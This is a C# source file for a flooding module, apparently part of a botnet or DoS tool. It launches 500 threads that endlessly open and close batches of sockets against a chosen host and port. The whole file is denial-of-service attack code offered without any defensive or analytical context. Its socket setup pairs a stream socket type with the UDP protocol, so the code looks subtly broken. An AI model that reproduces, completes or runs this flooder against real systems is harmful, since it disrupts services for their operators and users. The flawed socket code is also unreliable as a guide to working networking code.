using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace myApp
{
    class Udp
    {
        private static ThreadStart[] _floodingJob;
        private static Thread[] _floodingThread;
        private static IPEndPoint _ipEo;
        private static Sendudp[] _udpClass;
        public static string Host;
        public static bool IsEnabled;
        public static int Port = 80;
        public static int SuperudpSockets = 50;
        public static int Threads = 500;

        public static void StartSuperudp()
        {
            try
            {
                IPAddress[] addressList = Dns.GetHostEntry(Host).AddressList;
                _ipEo = new IPEndPoint(addressList[0], Port);
            }
            catch
            {
                IPAddress address = IPAddress.Parse(Host);
                _ipEo = new IPEndPoint(address, Port);
            }
            _floodingThread = new Thread[Threads];
            _floodingJob = new ThreadStart[Threads];
            _udpClass = new Sendudp[Threads];
            for (int i = 0; i < Threads; i++)
            {
                _udpClass[i] = new Sendudp(_ipEo, SuperudpSockets);
                _floodingJob[i] = new ThreadStart(_udpClass[i].Send);
                _floodingThread[i] = new Thread(_floodingJob[i]);
                _floodingThread[i].Start();
            }
            IsEnabled = true;
        }

        public static void StopSuperudp()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    _floodingThread[i].Abort();
                    _floodingThread[i] = null;
                    _floodingJob[i] = null;
                    _udpClass[i] = null;
                }
                catch
                {
                }
            }
            IsEnabled = false;
        }

        #region Nested type: Sendudp

        private class Sendudp
        {
            private Socket[] _sock;
            private IPEndPoint ipEo;
            private int SuperudpSockets;

            public Sendudp(IPEndPoint ipEo, int superudpSockets)
            {
                this.ipEo = ipEo;
                SuperudpSockets = superudpSockets;
            }

            private static void OnConnect(IAsyncResult ar)
            {
            }

            public void Send()
            {
                while (true)
                {
                    int num;
                    try
                    {
                        _sock = new Socket[SuperudpSockets];
                        for (num = 0; num < SuperudpSockets; num++)
                        {
                            _sock[num] = new Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp);
                            _sock[num].Blocking = false;
                            AsyncCallback callback = OnConnect;
                            _sock[num].BeginConnect(ipEo, callback, _sock[num]);
                        }
                        Thread.Sleep(100);
                        for (num = 0; num < SuperudpSockets; num++)
                        {
                            if (_sock[num].Connected)
                            {
                                _sock[num].Disconnect(false);
                            }
                            _sock[num].Close();
                            _sock[num] = null;
                        }
                        _sock = null;
                    }
                    catch
                    {
                        for (num = 0; num < SuperudpSockets; num++)
                        {
                            try
                            {
                                if (_sock != null)
                                {
                                    if (_sock[num].Connected)
                                    {
                                        _sock[num].Disconnect(false);
                                    }
                                    _sock[num].Close();
                                    _sock[num] = null;
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }
        }

        #endregion
    }
}